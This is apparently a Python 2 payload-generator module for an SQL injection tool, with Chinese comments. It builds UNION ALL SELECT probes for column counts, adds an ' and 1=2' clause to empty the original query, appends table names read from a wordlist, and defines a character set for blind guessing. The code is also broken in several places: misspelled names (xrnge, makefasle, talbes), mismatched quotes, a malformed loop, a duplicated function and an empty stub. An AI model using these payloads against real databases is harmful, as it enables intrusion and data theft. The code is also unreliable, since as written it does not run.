# -*- coding:utf-8 -*- 
#本脚本包含生成payload的各种处理函数,返回值均为payloads的列表格式(可以是嵌套列表)
#可以传递sql-tool.py里的全局变量
from lib import *


def SimpleTest():#非常简单的测试载荷
    p=SpecialXmlGetAll('simpletest.xml')
    for i in xrnge(0,len(p)):
        p[i]=MSHandle(p[i])
    return p

def FromFile(name="txt/sqlinjection.txt"):
    #从文件里读取payloads,默认txt/sqlinjection.txt
    #忽略#开头的行和空行
    f=open(name,'r')
    p=f.readlines()
    f.close()
    for i in xrange(0,len(p)):
        if p[i][0]=='#':
            p[i]=''
        else:
            p[i]=p[i].strip('\n')
    while 1:
        try:
            p.remove('')
        except ValueError:
            break
    return p

def unionequal(do=''):#do可以操作对字符串前缀或者后缀处理，处理的可选项见  lib.py里的prefix 和 suffix
    p=SpecialXmlGetAll('unionequal.xml')
    for i in xrange(0,len(p)):
        p[i]=prefix(p[i],do)
        p[i]=suffix(p[i],do)
        p[i]=MSHandle(p[i])
    return p





#所有打开文件均有空处理和#开头的注释行忽视
####配置
guessstring="a,b,c,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,1,2,3,4,5,6,7,8,9,0,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z"
gt=guessstring.split(',')
logicfalse=" and 1=2"#使用怎么样的字符串让前面select无结果
#这是猜解时涉及的字符范围，可按需添加或修改





def unionequal(makenull=0):#测试前面的select的列,makenull决定是否让前面的select逻辑为false
    p=[]
    if makenull==0:
        makefalse=""
    else:
        makefasle=logicfalse#见前面配置
    p.append(makefalse+" union all select *")
    p.append(makefalse+" union all select count(*)")
    ps=" union all select "
    for i in xrange(0,10):
        ps=ps+str(i)
        p.append(makefalse+ps)
        ps=ps+','
    return p

def uniontable(makenull=0,equal=0,talbes='tables.txt'):
    #猜解表，equal设置union select 后面列数情况,0则使用*,如需使用count(*)请自行修改
    #makenull决定是否让前面的select逻辑为false
    if makenull==0:
        makefalse=""
    else:
        makefasle=logicfalse#见前面配置
    if equal==0:
        ps=" union all select * from "
    else:
        ps=' union all select "
        for i n xrange(0,equal):
            ps=ps+str(i)+','
        ps=ps.strip(',')+" from "

    f=open(tables,'r')
    p=f.readlines()
    f.close()
    for i in xrange(0,len(p)):
        if p[i][0]=='#':
            p[i]=''
        else:
            p[i]=p[i].strip('\n')
    while 1:
        try:
            p.remove('')
        except ValueError:
            break
    for i in xrange(0,len(p)):
        p[i]=makefalse+ps+p[i]
    return p

def unioncolumn(makenull=0,equal=0,table='',columns="columns.txt"):
    pass
        
    
    
            
    
        
    
    




if __name__=='__main__':
    pass
